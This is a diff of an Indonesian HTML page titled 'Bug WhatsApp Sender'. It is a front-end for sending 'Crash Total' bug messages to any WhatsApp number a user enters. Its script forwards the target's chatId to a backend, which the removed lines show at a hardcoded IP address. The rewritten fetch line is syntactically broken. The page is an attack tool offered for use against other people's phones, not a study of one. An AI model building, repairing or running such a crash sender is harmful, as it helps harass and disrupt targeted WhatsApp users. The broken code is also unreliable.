@@ -2,123 +2,73 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Bug WhatsApp Sender</title>
+  <title>Bug Sender WA</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-
     body {
-      background: linear-gradient(135deg, #1f1c2c, #928dab);
-      font-family: 'Poppins', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      color: white;
-    }
-
-    .container {
-      background-color: rgba(0, 0, 0, 0.4);
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
-      width: 90%;
-      max-width: 400px;
+      background-color: #121212;
+      font-family: Arial, sans-serif;
+      color: #fff;
       text-align: center;
-      backdrop-filter: blur(10px);
+      padding: 40px;
     }
-
-    h1 {
-      font-size: 24px;
-      margin-bottom: 25px;
-      color: #ffd700;
-      animation: glow 1.5s ease-in-out infinite alternate;
-    }
-
-    @keyframes glow {
-      from { text-shadow: 0 0 5px #ff00ff, 0 0 10px #ff00ff; }
-      to { text-shadow: 0 0 20px #ff00ff, 0 0 40px #ff00ff; }
-    }
-
     input, select, button {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 12px;
+      padding: 10px;
+      margin: 10px;
+      border-radius: 8px;
       border: none;
       font-size: 16px;
     }
-
-    input, select {
-      background-color: #2d2d2d;
-      color: white;
-    }
-
     button {
-      background-color: #7f00ff;
+      background-color: #6a0dad;
       color: white;
-      font-weight: bold;
-      transition: background-color 0.3s;
+      cursor: pointer;
     }
-
-    button:hover {
-      background-color: #a700ff;
-    }
-
     .result {
-      margin-top: 15px;
-      font-size: 15px;
-    }
-
-    .success {
-      color: #00ff9f;
-    }
-
-    .error {
-      color: #ff5555;
+      margin-top: 20px;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>💥 Bug WhatsApp Sender</h1>
+  <h1>💥 Bug WhatsApp Sender</h1>
 
-    <input type="text" id="chatId" placeholder="628xxxx@s.whatsapp.net">
-    
-    <select id="type">
-      <option value="crashtotal">🔥 Crash Total</option>
-      <!-- Tambahkan lebih banyak type jika perlu -->
-    </select>
+  <input type="text" id="chatId" placeholder="Masukkan Nomor WA (62xxxx@s.whatsapp.net)">
+  <br>
 
-    <button onclick="sendBug()">🚀 Kirim Bug</button>
+  <select id="type">
+    <option value="crashtotal">Crash Total</option>
+    <!-- Tambah opsi lain di sini -->
+  </select>
+  <br>
 
-    <div class="result" id="result"></div>
-  </div>
+  <button onclick="sendBug()">Kirim Bug</button>
+
+  <div class="result" id="result"></div>
 
   <script>
     async function sendBug() {
-      const chatId = document.getElementById("chatId").value.trim();
+      const chatId = document.getElementById("chatId").value;
       const type = document.getElementById("type").value;
       const resultBox = document.getElementById("result");
 
       if (!chatId.includes("@s.whatsapp.net")) {
-        resultBox.innerHTML = "<span class='error'>❌ Format chatId salah (harus @s.whatsapp.net)</span>";
+        resultBox.innerText = "❌ chatId harus lengkap (misal: 628123456789@s.whatsapp.net)";
         return;
       }
 
-      resultBox.innerHTML = "⏳ Mengirim bug...";
+      resultBox.innerText = "⏳ Mengirim bug...";
 
       try {
-        const res = await fetch(`http://159.65.217.174:3006/permen?chatId=${encodeURIComponent(chatId)}&type=${type}`);
+        const res = await ("/api/permen?chatId=${encodeURIComponent(chatId)}&type=${type}`")`);
         const data = await res.json();
 
         if (data.status) {
-          resultBox.innerHTML = `<span class="success">✅ ${data.message}</span>`;
+          resultBox.innerText = `✅ ${data.message}`;
         } else {
-          resultBox.innerHTML = `<span class="error">❌ ${data.message}</span>`;
+          resultBox.innerText = `❌ ${data.message}`;
         }
       } catch (err) {
-        resultBox.innerHTML = `<span class="error">❌ Error: Failed to fetch<br>${err.message}</span>`;
+        resultBox.innerText = `❌ Error: ${err.message}`;
       }
     }
   </script>
